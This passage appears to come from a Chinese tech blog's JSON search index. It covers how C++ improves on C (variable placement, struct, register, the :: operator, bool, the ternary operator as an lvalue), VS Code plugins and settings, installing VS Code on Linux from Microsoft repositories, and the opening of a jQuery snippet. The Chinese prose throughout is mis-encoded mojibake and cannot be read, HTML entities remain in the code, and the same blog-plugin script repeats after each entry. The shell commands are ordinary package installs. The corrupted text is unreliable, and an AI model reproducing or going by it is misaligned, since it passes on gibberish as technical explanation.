‡æ˜¯ç¨‹åºæ‰§è¡Œæ•ˆç‡çš„é«˜æ•ˆã€‚å½“é¢å‘è¿‡ç¨‹æ–¹æ³•è®ºæš´éœ²è¶Šæ¥è¶Šå¤šçš„ç¼ºé™·çš„æ—¶å€™ï¼Œä¸šç•Œå¼€å§‹è€ƒè™‘åœ¨å·¥ç¨‹é¡¹ç›®ä¸­å¼•å…¥é¢å‘å¯¹è±¡çš„è®¾è®¡æ–¹æ³•ï¼Œè€Œç¬¬ä¸€ä¸ªéœ€è¦è§£å†³çš„é—®é¢˜å°±æ˜¯ï¼šé«˜æ•ˆçš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œå¹¶ä¸”èƒ½å¤Ÿå…¼å®¹å·²ç»å­˜åœ¨çš„ä»£ç ã€‚C è¯­è¨€å’Œ C++ è¯­è¨€çš„å…³ç³»å¦‚ä¸‹ï¼š C è¯­è¨€å’Œ C++ å¹¶ä¸æ˜¯å¯¹ç«‹çš„ç«äº‰å…³ç³» C++ æ˜¯ C è¯­è¨€çš„åŠ å¼ºï¼Œæ˜¯ä¸€ç§æ›´å¥½çš„ C è¯­è¨€ C++ æ˜¯ä»¥ C è¯­è¨€ä¸ºåŸºç¡€çš„ï¼Œå¹¶ä¸”å®Œå…¨å…¼å®¹ C è¯­è¨€çš„ç‰¹æ€§ C è¯­è¨€ + é¢å‘å¯¹è±¡æ–¹æ³•è®º â€”&gt; C++ / Objective C C++ å¯¹ C è¯­è¨€çš„å¢å¼ºå®ç”¨æ€§å¢å¼ºC è¯­è¨€ä¸­çš„å˜é‡éƒ½å¿…é¡»åœ¨ä½œç”¨åŸŸå¼€å§‹çš„ä½ç½®å®šä¹‰ï¼Œè€Œ C++ ä¸­æ›´å¼ºè°ƒè¯­è¨€çš„ å®ç”¨æ€§ï¼Œæ‰€æœ‰çš„å˜é‡éƒ½å¯ä»¥åœ¨éœ€è¦ä½¿ç”¨æ—¶å†å®šä¹‰ã€‚ 1234567int main(int argc, char *argv[]){ int a = 0; printf("hello world\\n"); int b = 13; // Cè¯­è¨€ç¼–è¯‘å™¨ä¸­ç¼–è¯‘æŠ¥é”™ï¼Œä½†æ˜¯C++ç¼–è¯‘å™¨ä¸­ä¸ä¼šæŠ¥é”™ return 0;} å˜é‡æ£€æµ‹å¢å¼ºåœ¨ C è¯­è¨€ä¸­ï¼Œé‡å¤å®šä¹‰å¤šä¸ªåŒåçš„å…¨å±€å˜é‡æ˜¯åˆæ³•çš„ï¼Œä½†åœ¨ C++ ä¸­ï¼Œä¸å…è®¸å®šä¹‰å¤šä¸ªåŒåçš„å…¨å±€å˜é‡ã€‚C è¯­è¨€ä¸­å¤šä¸ªåŒåçš„å…¨å±€å˜é‡æœ€ç»ˆä¼šè¢«é“¾æ¥åˆ°å…¨å±€æ•°æ®åŒºçš„åŒä¸€ä¸ªåœ°å€ç©ºé—´ä¸Šã€‚ 12int g_var;int g_var = 1; // C++ç›´æ¥æ‹’ç»è¿™ç§äºŒä¹‰æ€§çš„åšæ³• struct ç±»å‹çš„å¢å¼ºC è¯­è¨€çš„ struct å®šä¹‰äº†ä¸€ç»„å˜é‡çš„é›†åˆï¼ŒC ç¼–è¯‘å™¨å¹¶ä¸è®¤ä¸ºè¿™æ˜¯ä¸€ç§æ–°çš„ç±»å‹ï¼Œè€Œåœ¨ C++ ä¸­çš„ struct æ˜¯ä¸€ä¸ªæ–°ç±»å‹çš„å®šä¹‰å£°æ˜ã€‚ 123456789101112struct Student{ char name[100]; int age;};int main(int argc, char *argv[]){ Student s1 = {"wang", 1}; // Cè¯­è¨€ç¼–è¯‘å™¨ç¼–è¯‘æŠ¥é”™ï¼ŒC++ç¼–è¯‘å™¨ç¼–è¯‘é€šè¿‡ struct Student s2 = {"chen", 1}; // Cè¯­è¨€ç¼–è¯‘å™¨ç¼–è¯‘é€šè¿‡ return 0;} register å…³é”®å­—å¢å¼ºregister æ˜¯è¿è¡Œé€Ÿåº¦æœ€å¿«çš„å…³é”®å­—ï¼Œå…¶ä½œç”¨æ˜¯è¯·æ±‚ç¼–è¯‘å™¨å°½å¯èƒ½åœ°å°†å˜é‡å­˜åœ¨ CPU å†…éƒ¨çš„å¯„å­˜å™¨ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡å†…å­˜å¯»å€è®¿é—®ï¼Œä»¥æé«˜ç¨‹åºè¿è¡Œæ•ˆç‡ã€‚æ³¨æ„è¿™é‡Œæ˜¯å°½å¯èƒ½ï¼Œä¸æ˜¯ç»å¯¹ã€‚é¦–å…ˆï¼Œregister å˜é‡å¿…é¡»æ˜¯èƒ½è¢« CPU æ‰€æ¥å—çš„ç±»å‹ï¼Œè¿™é€šå¸¸æ„å‘³ç€ register å˜é‡å¿…é¡»æ˜¯ä¸€ä¸ªå•ä¸ªçš„å€¼ï¼Œå¹¶ä¸”é•¿åº¦åº”è¯¥å°äºæˆ–è€…ç­‰äºæ•´å‹çš„é•¿åº¦ã€‚ä¸è¿‡ï¼Œæœ‰äº›æœºå™¨çš„å¯„å­˜å™¨ä¹Ÿèƒ½å­˜æ”¾æµ®ç‚¹æ•°ã€‚C è¯­è¨€ä¸­ï¼Œregister å…³é”®å­—è¡¨ç¤º â€œè¯·æ±‚â€ï¼ˆä¸ä¸€å®šæˆåŠŸï¼‰è®©å˜é‡ç›´æ¥æ”¾è¿›å¯„å­˜å™¨ä¸­ï¼Œæ–¹ä¾¿è®¿é—®ï¼Œä½†æ˜¯åœ¨ C è¯­è¨€ä¸­ä¸èƒ½å– register å˜é‡çš„åœ°å€ã€‚C++ å¯¹ register è¿›è¡Œäº†å¢å¼ºï¼ŒC++ ç¼–è¯‘å™¨ä¼šå¯¹é¢‘ç¹è¢«è°ƒç”¨çš„å˜é‡ä¸»åŠ¨ç”³è¯·ä¸º registerï¼Œå³ä½¿æ²¡æœ‰ç”¨ register å…³é”®å­—å£°æ˜ï¼Œå®ƒä¹Ÿä¼šè¿™æ ·åšã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒC++ ç¼–è¯‘å™¨å½“å‘ç°ç¨‹åºä¸­éœ€è¦å¯¹ register å˜é‡å–åœ°å€æ—¶ï¼Œregister å¯¹å˜é‡çš„å£°æ˜ä¼šå˜å¾—æ— æ•ˆã€‚ 123456int main(int argc, char *argv[]){ register int a = 0; printf("&amp;a = %x\\n", &amp;a); return 0;} ç”±äºå¯„å­˜å™¨çš„æ•°é‡æœ‰é™ï¼Œè€Œä¸”æŸäº›å¯„å­˜å™¨åªèƒ½æ¥æ”¶ç‰¹å®šç±»å‹çš„æ•°æ®ï¼ˆå¦‚æŒ‡é’ˆå’Œæµ®ç‚¹æ•°ï¼‰ï¼Œå› æ­¤çœŸæ­£èµ·ä½œç”¨çš„ register ä¿®é¥°ç¬¦çš„æ•°ç›®å’Œç±»å‹éƒ½ä¾èµ–äºå®é™…è¿è¡Œç¨‹åºçš„æœºå™¨ï¼Œè€Œä»»ä½•å¤šä½™çš„ register ä¿®é¥°ç¬¦éƒ½å°†è¢«ç¼–è¯‘å™¨æ‰€å¿½ç•¥ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŠŠå˜é‡ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­åè€Œä¼šé™ä½ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ï¼Œè¿™å› ä¸ºè¢«å ç”¨çš„å¯„å­˜å™¨ä¸èƒ½å†ç”¨äºå…¶å®ƒç”¨é€”ï¼›æˆ–è€…å˜é‡è¢«ä½¿ç”¨çš„æ¬¡æ•°ä¸å¤Ÿå¤šï¼Œä¸è¶³ä»¥æŠµæ¶ˆè£…å…¥å’Œå­˜å‚¨å˜é‡æ‰€å¸¦æ¥çš„é¢å¤–å¼€é”€ã€‚æ—©æœŸçš„ C ç¼–è¯‘å™¨ä¸ä¼šè‡ªåŠ¨æŠŠå˜é‡ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œé™¤éç¨‹åºå‘˜å‘½ä»¤å®ƒè¿™æ ·åšï¼Œè¿™æ—¶ register ä¿®é¥°ç¬¦æ˜¯ C è¯­è¨€çš„ä¸€ç§å¾ˆæœ‰ä»·å€¼çš„è¡¥å……ã€‚ç„¶è€Œï¼Œéšç€ç¼–è¯‘ç¨‹åºè®¾è®¡æŠ€æœ¯çš„è¿›æ­¥ï¼Œåœ¨å†³å®šå“ªäº›å˜é‡åº”è¯¥è¢«å­˜åˆ°å¯„å­˜å™¨ä¸­æ—¶ï¼Œç°ä»£çš„ C ç¼–è¯‘å™¨èƒ½æ¯”ç¨‹åºå‘˜åšå‡ºæ›´å¥½çš„å†³å®šã€‚å®é™…ä¸Šï¼Œè®¸å¤šç¼–è¯‘å™¨éƒ½ä¼šå¿½ç•¥ register ä¿®é¥°ç¬¦ï¼Œå°½ç®¡å®ƒå®Œå…¨åˆæ³•ï¼Œä½†å®ƒä»…ä»…æ˜¯æš—ç¤ºè€Œä¸æ˜¯å‘½ä»¤ã€‚ ä½œç”¨åŸŸé™å®šè¿ç®—ç¬¦ä½œç”¨åŸŸé™å®šè¿ç®—ç¬¦ï¼Œç”¨äºå¯¹å½“å‰ä½œç”¨åŸŸä¹‹å¤–çš„åŒåå˜é‡è¿›è¡Œè®¿é—®ï¼Œä¾‹å¦‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œå¯ä»¥åˆ©ç”¨ :: å®ç°åœ¨å±€éƒ¨å˜é‡ a çš„ä½œç”¨åŸŸå†…å¯¹å…¨å±€å˜é‡ a çš„è®¿é—®ã€‚ 1234567891011121314#include &lt;iostream&gt;using namespace std;int a;int main() { float a; a = 3.14; ::a = 6; cout &lt;&lt; "local variable a = " &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; "global variable a = " &lt;&lt; ::a &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12local variable a = 3.14global variable a = 6 æ–°å¢ Bool ç±»å‹å…³é”®å­—C++ åœ¨ C è¯­è¨€çš„åŸºæœ¬ç±»å‹ç³»ç»Ÿä¹‹ä¸Šå¢åŠ äº† bool ç±»å‹å…³é”®å­—ï¼Œbool å¯å–çš„å€¼åªæœ‰ true å’Œ falseã€‚ç†è®ºä¸Š bool å˜é‡åªå ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¤šä¸ª bool å˜é‡å®šä¹‰åœ¨ä¸€èµ·ï¼Œå¯èƒ½ä¼šå„å ä¸€ä¸ª bitï¼ˆä½ï¼‰ï¼Œè¿™å–å†³äºç¼–è¯‘å™¨çš„å®ç°ã€‚true ä»£è¡¨çœŸå€¼ï¼Œç¼–è¯‘å™¨å†…éƒ¨ç”¨ 1 æ¥è¡¨ç¤ºï¼Œfalse ä»£è¡¨éçœŸå€¼ï¼Œç¼–è¯‘å™¨å†…éƒ¨ç”¨ 0 æ¥è¡¨ç¤ºã€‚C++ ç¼–è¯‘å™¨ä¼šåœ¨èµ‹å€¼æ—¶å°†é 0 å€¼è½¬æ¢ä¸º trueï¼Œ0 å€¼è½¬æ¢ä¸º falseã€‚ 1234567int main(int argc, char *argv[]){ int a; bool b = true; printf("b = %d, sizeof(b) = %d\\n", b, sizeof(b)); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1b = 1, sizeof(b) = 1 ä¸‰ç›®è¿ç®—ç¬¦åŠŸèƒ½å¢å¼º12345678910int main(int argc, char *argv[]) int a = 10; int b = 20; // è¿”å›ä¸€ä¸ªæœ€å°æ•°ï¼Œå¹¶ä¸”ç»™æœ€å°æ•°èµ‹å€¼æˆ30 // C è¯­è¨€ä¸­ä¸‰ç›®è¿ç®—ç¬¦æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ ï¼Œè¡¨è¾¾å¼ä¸å¯ä»¥åšå·¦å€¼ï¼Œè€Œ C++ åˆ™å¯ä»¥ (a &lt; b ? a : b) = 30; printf("a = %d, b = %d\\n", a, b); return 0;} ç¨‹åºè¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š 1a = 30, b = 20 ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦æ—¶ï¼ŒC è¯­è¨€è¿”å›å˜é‡çš„å€¼ï¼ŒC++ æ˜¯è¿”å›å˜é‡æœ¬èº« C è¯­è¨€ä¸­çš„ä¸‰ç›®è¿ç®—ç¬¦è¿”å›çš„æ˜¯å˜é‡å€¼ï¼Œä¸èƒ½ä½œä¸ºå·¦å€¼ä½¿ç”¨ C++ ä¸­çš„ä¸‰ç›®è¿ç®—ç¬¦å¯ç›´æ¥è¿”å›å˜é‡æœ¬èº«ï¼Œå› æ­¤å¯ä»¥å‡ºç°åœ¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹ ç‰¹åˆ«æ³¨æ„ï¼šC++ ä¸­ä¸‰ç›®è¿ç®—ç¬¦å¯èƒ½è¿”å›çš„å€¼ä¸­å¦‚æœæœ‰ä¸€ä¸ªæ˜¯å¸¸é‡å€¼ï¼Œåˆ™ä¸èƒ½ä½œä¸ºå·¦å€¼ä½¿ç”¨ï¼Œä¾‹å¦‚ (a &lt; b ? 1 : b )= 30; C è¯­è¨€å¦‚ä½•æ”¯æŒç±»ä¼¼ C++ çš„ä¸‰ç›®è¿ç®—ç‰¹æ€§å‘¢ï¼Ÿå½“å·¦å€¼çš„æ¡ä»¶ï¼šè¦æœ‰å†…å­˜ç©ºé—´ï¼Œè€Œ C++ ç¼–è¯‘å™¨åªæ˜¯å¸®åŠ©ç¨‹åºå‘˜å–äº†ä¸€ä¸ªåœ°å€è€Œå·²ï¼ŒC è¯­è¨€ç‰ˆçš„å†™æ³•ä¸ºï¼š*(a &lt; b ? &amp;a : &amp;b) = 30 æ‰€æœ‰çš„å˜é‡å’Œå‡½æ•°éƒ½å¿…é¡»å£°æ˜ç±»å‹ C è¯­è¨€é»˜è®¤æ•°æ®ç±»å‹åœ¨ C++ ç¼–è¯‘å™¨ä¸­æ˜¯ä¸åˆæ³•çš„ï¼ŒC++ ä¸­æ‰€æœ‰å˜é‡å’Œå‡½æ•°å¿…é¡»å£°æ˜ç±»å‹ã€‚ä»¥ä¸‹ä»£ç åœ¨ C è¯­è¨€ä¸­èƒ½ç¼–è¯‘é€šè¿‡ï¼Œä½†åœ¨ C++ ä¸­ä¼šç¼–è¯‘æŠ¥é”™ã€‚ 1234567891011121314151617f(i){ printf("i = %d\\n", i);}g(){ return 5;}int main(int argc, char *argv[]){ f(10); printf("g() = %d\\n", g(1, 2, 3, 4, 5)); getchar(); return 0;} åœ¨ C è¯­è¨€ä¸­ï¼Œint f() è¡¨ç¤ºè¿”å›å€¼ä¸º intï¼Œæ¥å—ä»»æ„å‚æ•°çš„å‡½æ•° åœ¨ C è¯­è¨€ä¸­ï¼Œint f(void) è¡¨ç¤ºè¿”å›å€¼ä¸º int çš„æ— å‚å‡½æ•° åœ¨ C++ ä¸­ï¼Œint f() å’Œ int f(void) å…·æœ‰ç›¸åŒçš„æ„ä¹‰ï¼Œéƒ½è¡¨ç¤ºè¿”å›å€¼ä¸º int çš„æ— å‚å‡½æ•° C++ æ›´åŠ å¼ºè°ƒç±»å‹ï¼Œä»»æ„çš„ç¨‹åºå…ƒç´ éƒ½å¿…é¡»æ˜¾ç¤ºæŒ‡æ˜ç±»å‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"VS Code å…¥é—¨æ•™ç¨‹ä¹‹äºŒæ‰“é€  Markdown ç¼–è¾‘å™¨",url:"/posts/3baa0a8d.html",text:'å¸¸ç”¨æ’ä»¶æ–‡ä»¶å›¾æ ‡ä¸»é¢˜ Material Icon Themeï¼Œä¸€æ¬¾éå¸¸æ¼‚äº®çš„æ–‡ä»¶å›¾æ ‡ä¸»é¢˜ è‡ªåŠ¨éšè—ä¾§è¾¹æ  Auto Hideï¼Œæ”¯æŒè‡ªåŠ¨éšè—ä¾§è¾¹æ  Markdown æ’ä»¶Markdown é¢„è§ˆ Markdown Preview Mermaid Supportï¼Œå®æ—¶é¢„è§ˆ Mermaid ç»˜å›¾ Markdown Preview Enhancedï¼Œæ”¯æŒ Markdown å®æ—¶é¢„è§ˆç­‰å„ç§å¼ºå¤§çš„åŠŸèƒ½ Markdown å¿«æ·é”® Markdown Shortcutsï¼Œæ”¯æŒå„ç§ Markdown å¿«æ·é”® Markdown è¡¨æ ¼æ’å…¥ MarkDown Table Formatï¼Œæ”¯æŒä½¿ç”¨å¿«æ·é”®å…¨å±€æ ¼å¼åŒ– Markdown è¡¨æ ¼ Markdown Tableï¼Œå¿«é€Ÿæ’å…¥ Markdown è¡¨æ ¼ï¼Œæ”¯æŒè¡¨æ ¼è‡ªåŠ¨æ ¼å¼åŒ–å’Œè‡ªåŠ¨æ’å…¥è¡Œ Markdown æ–‡æ¡£å¯¼å‡º Markdown PDFï¼ŒMarkdown æ–‡æ¡£è½¬ PDF æ–‡æ¡£ Markdown è¯­æ³•é«˜äº® Mermaid Markdown Syntax Highlightingï¼Œæ”¯æŒ Mermaid ç»˜å›¾çš„è¯­æ³•é«˜äº® Markdown å›¾ç‰‡ç²˜è´´ Markdown QiNiuï¼Œæ”¯æŒå°†ç²˜è´´æ¿é‡Œçš„å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›å›¾åºŠ Markdown Pasteï¼Œæ”¯æŒå°†ç²˜è´´æ¿é‡Œçš„å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°ï¼Œå¹¶å°†å›¾ç‰‡çš„é“¾æ¥è‡ªåŠ¨åŠ å…¥åˆ° Markdown æ–‡æ¡£ä¸­ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"VS Code å…¥é—¨æ•™ç¨‹ä¹‹ä¸€åŸºç¡€ä½¿ç”¨",url:"/posts/879c28df.html",text:'å¸¸ç”¨æ’ä»¶æ–‡ä»¶å›¾æ ‡ä¸»é¢˜ vscode-icons Material Icon Theme è‡ªåŠ¨éšè—ä¾§è¾¹æ  Auto Hide è‡ªåŠ¨æ›´æ–°å…³é—­ VS Code è‡ªåŠ¨æ›´æ–°æ–¹æ³•ä¸€ï¼š æ‰“å¼€èœå• File ä¸­ Preferences å­èœå•ä¸­é€‰æ‹© Settings é¡¹ï¼Œæœç´¢ update modeï¼Œå°†å…¶è®¾ç½®ä¸º noneï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ–¹æ³•äºŒï¼š æ‰“å¼€ æŸ¥çœ‹ï¼ˆViewï¼‰èœå•ï¼Œé€‰æ‹© å‘½ä»¤é¢æ¿ï¼ˆCommand Paletteï¼‰ èœå•é¡¹æˆ–è€…ä½¿ç”¨ï¼ˆCtrl + Shift + Pï¼‰å¿«æ·é”®æ‰“å¼€å‘½ä»¤é¢æ¿ã€‚ åœ¨å‘½ä»¤é¢æ¿ä¸­ï¼Œè¾“å…¥ Preferences: Open Settings (JSON)ï¼Œæ‰“å¼€ç”¨æˆ·é…ç½® JSON çš„ç¼–è¾‘ç•Œé¢ï¼Œæ·»åŠ é…ç½®å†…å®¹ "update.mode": "none"ã€‚ å…³é—­ VS Code è‡ªåŠ¨æ›´æ–°æ’ä»¶æ–¹æ³•ä¸€ï¼š æ‰“å¼€èœå• File ä¸­ Preferences å­èœå•ä¸­é€‰æ‹© Settings é¡¹ï¼Œæœç´¢ Extensions: Auto Updateï¼Œå–æ¶ˆå¤é€‰æ¡†çš„é€‰ä¸­çŠ¶æ€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ–¹æ³•äºŒï¼š æ‰“å¼€ æŸ¥çœ‹ï¼ˆViewï¼‰èœå•ï¼Œé€‰æ‹© å‘½ä»¤é¢æ¿ï¼ˆCommand Paletteï¼‰ èœå•é¡¹æˆ–è€…ä½¿ç”¨ï¼ˆCtrl + Shift + Pï¼‰å¿«æ·é”®æ‰“å¼€å‘½ä»¤é¢æ¿ã€‚ åœ¨å‘½ä»¤é¢æ¿ä¸­ï¼Œè¾“å…¥ Preferences: Open Settings (JSON)ï¼Œæ‰“å¼€ç”¨æˆ·é…ç½® JSON ç¼–è¾‘ç•Œé¢ï¼Œæ·»åŠ é…ç½®å†…å®¹ "extensions.autoUpdate": falseã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Linux å®‰è£… VS Code",url:"/posts/d8f0998b.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äº Debian/Ubuntuã€RHEL/Fedora/CentOSã€openSUSE/SLE-basedã€Arch ç­‰ Linux å‘è¡Œç‰ˆã€‚ VS Code å®‰è£…Debian / Ubuntu å®‰è£…è½¯ä»¶ä»“åº“æºå’Œå¯†é’¥ 1234$ wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; packages.microsoft.gpg$ sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/$ sudo sh -c \'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" &gt; /etc/apt/sources.list.d/vscode.list\'$ rm -f packages.microsoft.gpg æ›´æ–°å®‰è£…åŒ…ç¼“å­˜ï¼Œå¹¶å®‰è£… VS Code 123$ sudo apt install apt-transport-https$ sudo apt update$ sudo apt install code RHEL/Fedora/CentOS å®‰è£…è½¯ä»¶ä»“åº“æºå’Œå¯†é’¥ 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/yum.repos.d/vscode.repo\' æ›´æ–°å®‰è£…åŒ…ç¼“å­˜ï¼Œå¹¶ä½¿ç”¨ dnfï¼ˆFedora 22 åŠæ›´é«˜ç‰ˆæœ¬ï¼‰ å®‰è£… VS Code 12$ sudo dnf check-update$ sudo dnf install code æˆ–è€…åœ¨æ—§ç‰ˆæœ¬çš„ CentOS ä¸Šä½¿ç”¨ yum å®‰è£… VS Code 12$ sudo yum check-update$ sudo yum install code è‹¥ VS Code æˆåŠŸå®‰è£…åï¼Œåœ¨ç³»ç»Ÿçš„åº”ç”¨èœå•æ é‡Œæ‰¾ä¸åˆ°å¿«æ·å¯åŠ¨æ–¹å¼ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç³»ç»Ÿç•Œé¢ï¼›ç„¶åå¯¼èˆªåˆ°åº”ç”¨èœå•æ ï¼šåº”ç”¨ç¨‹åº â€“&gt; ç¼–ç¨‹ â€“&gt; Visual Studio Codeï¼ŒåŒå‡»å¿«æ·å¯åŠ¨æ–¹å¼çš„å›¾æ ‡å³å¯å¯åŠ¨ VS Codeã€‚ openSUSE/SLE-based å®‰è£…è½¯ä»¶ä»“åº“æºå’Œå¯†é’¥ 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ntype=rpm-md\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/zypp/repos.d/vscode.repo\' æ›´æ–°å®‰è£…åŒ…ç¼“å­˜ï¼Œå¹¶å®‰è£… VS Code 12$ sudo zypper refresh$ sudo zypper install code ArchVS Code æœ‰ä¸€ä¸ªç¤¾åŒºç»´æŠ¤çš„ Arch ç”¨æˆ·å­˜å‚¨åº“åŒ…ï¼Œè¦ä» AUR è·å–æœ‰å…³å®‰è£…çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä»¥ä¸‹ WiKi æ¡ç›®ï¼š å®‰è£… AUR åŒ…ã€‚ Snapé€šè¿‡ Snap å®‰è£… VS Codeï¼Œæ­¤å®‰è£…æ–¹å¼é€‚ç”¨äº RHEL ç³»ã€Debian ç³»ã€ openSUSE ç³»ç­‰å¤§å¤šæ•°ä¸»æµçš„ Linux å‘è¡Œç‰ˆï¼ŒSnap çš„å®‰è£…å’Œä½¿ç”¨å¯å‚è€ƒ æœ¬ç«™æ•™ç¨‹ã€‚VS Code æˆåŠŸå®‰è£…åï¼ŒSnap çš„å®ˆæŠ¤è¿›ç¨‹å°†è´Ÿè´£åœ¨åå°è‡ªåŠ¨æ›´æ–° VS Codeï¼Œæ¯å½“æœ‰æ–°çš„æ›´æ–°å¯ç”¨æ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ VS Codeã€‚ 12345$ sudo snap install --classic codeæˆ–è€…$ sudo snap install --classic code-insiders VS Code è®¾ç½®å­—ä½“ ä¸‹è½½å­—ä½“ 12$ cd /usr/share/fonts/truetype/$ git clone https://github.com/abertsch/Menlo-for-Powerline.git åˆ·æ–°å­—ä½“ 1$ fc-cache -f -v è®¾ç½®å­—ä½“ æˆ–è€…ç¼–è¾‘ VS Code çš„ setting.json é…ç½®æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åŠ å…¥ä»¥ä¸‹é…ç½®å†…å®¹ï¼š 1"editor.fontFamily": "\'Menlo for Powerline\'" é‡å¯ VS Codeï¼Œè®©å­—ä½“æ›´æ”¹ç”Ÿæ•ˆ VS Code ç‰ˆæœ¬æ›´æ–°VS Code æ¯æœˆå‘å¸ƒä¸€æ¬¡ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹å‘è¡Œæ—¥å¿—äº†è§£ä½•æ—¶æœ‰æ–°ç‰ˆæœ¬å¯ç”¨ã€‚å¦‚æœ VS Code è½¯ä»¶ä»“åº“æºå®‰è£…æ­£ç¡®ï¼Œé‚£ä¹ˆ VS Code åº”è¯¥ä¼šä¸ç³»ç»Ÿä¸Šçš„å…¶ä»–è½¯ä»¶åŒ…ä»¥ç›¸åŒçš„æ–¹å¼è‡ªåŠ¨æ›´æ–°ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç”±äºå—é™äºæ‰‹åŠ¨ç­¾åè¿‡ç¨‹å’Œå®˜æ–¹ç”¨äºå‘å¸ƒçš„ç³»ç»Ÿï¼Œyum repo å¯èƒ½ä¼šæ»åå¹¶ä¸”æ— æ³•ç«‹å³è·å–åˆ°æœ€æ–°ç‰ˆæœ¬çš„ VS Codeã€‚ å‚è€ƒèµ„æ–™ Linux å®‰è£… VS Code å®˜æ–¹æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘å·¥å…·"},{title:"JQuery å¸¸ç”¨ä»£ç å—",url:"/posts/b4df07d2.html",text:'é€‰æ‹©å™¨åˆ é™¤èŠ‚ç‚¹çš„æ‰€æœ‰å±æ€§1234567891011jQuery.fn.removeAttributes = function() { return this.each(function() { var attributes = $.map(this.attributes, function(item) { return item.name; 